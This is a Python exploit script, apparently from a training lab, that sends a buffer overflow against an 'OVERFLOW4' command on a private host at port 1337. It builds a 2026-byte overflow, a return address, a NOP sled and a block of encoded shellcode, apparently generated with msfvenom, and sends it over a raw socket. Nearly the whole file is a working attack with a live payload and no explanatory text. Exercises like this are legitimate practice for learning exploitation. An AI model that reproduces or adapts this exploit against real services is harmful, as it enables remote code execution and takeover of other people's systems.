import socket

ip = "10.10.162.170"
port = 1337

prefix = "OVERFLOW4 "
offset = 2026
overflow = "A" * offset
retn = "\xaf\x11\x50\x62"
padding = "\x90"*16
postfix = ""
payload = ("\xba\xd6\x76\x45\xe2\xdb\xd6\xd9\x74\x24\xf4\x5f\x33\xc9"
"\xb1\x52\x31\x57\x12\x03\x57\x12\x83\x39\x8a\xa7\x17\x39"
"\x9b\xaa\xd8\xc1\x5c\xcb\x51\x24\x6d\xcb\x06\x2d\xde\xfb"
"\x4d\x63\xd3\x70\x03\x97\x60\xf4\x8c\x98\xc1\xb3\xea\x97"
"\xd2\xe8\xcf\xb6\x50\xf3\x03\x18\x68\x3c\x56\x59\xad\x21"
"\x9b\x0b\x66\x2d\x0e\xbb\x03\x7b\x93\x30\x5f\x6d\x93\xa5"
"\x28\x8c\xb2\x78\x22\xd7\x14\x7b\xe7\x63\x1d\x63\xe4\x4e"
"\xd7\x18\xde\x25\xe6\xc8\x2e\xc5\x45\x35\x9f\x34\x97\x72"
"\x18\xa7\xe2\x8a\x5a\x5a\xf5\x49\x20\x80\x70\x49\x82\x43"
"\x22\xb5\x32\x87\xb5\x3e\x38\x6c\xb1\x18\x5d\x73\x16\x13"
"\x59\xf8\x99\xf3\xeb\xba\xbd\xd7\xb0\x19\xdf\x4e\x1d\xcf"
"\xe0\x90\xfe\xb0\x44\xdb\x13\xa4\xf4\x86\x7b\x09\x35\x38"
"\x7c\x05\x4e\x4b\x4e\x8a\xe4\xc3\xe2\x43\x23\x14\x04\x7e"
"\x93\x8a\xfb\x81\xe4\x83\x3f\xd5\xb4\xbb\x96\x56\x5f\x3b"
"\x16\x83\xf0\x6b\xb8\x7c\xb1\xdb\x78\x2d\x59\x31\x77\x12"
"\x79\x3a\x5d\x3b\x10\xc1\x36\x4e\xeb\xae\x0f\x26\xf1\x30"
"\x81\xeb\x7c\xd6\xcb\x03\x29\x41\x64\xbd\x70\x19\x15\x42"
"\xaf\x64\x15\xc8\x5c\x99\xd8\x39\x28\x89\x8d\xc9\x67\xf3"
"\x18\xd5\x5d\x9b\xc7\x44\x3a\x5b\x81\x74\x95\x0c\xc6\x4b"
"\xec\xd8\xfa\xf2\x46\xfe\x06\x62\xa0\xba\xdc\x57\x2f\x43"
"\x90\xec\x0b\x53\x6c\xec\x17\x07\x20\xbb\xc1\xf1\x86\x15"
"\xa0\xab\x50\xc9\x6a\x3b\x24\x21\xad\x3d\x29\x6c\x5b\xa1"
"\x98\xd9\x1a\xde\x15\x8e\xaa\xa7\x4b\x2e\x54\x72\xc8\x4e"
"\xb7\x56\x25\xe7\x6e\x33\x84\x6a\x91\xee\xcb\x92\x12\x1a"
"\xb4\x60\x0a\x6f\xb1\x2d\x8c\x9c\xcb\x3e\x79\xa2\x78\x3e"
"\xa8")

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
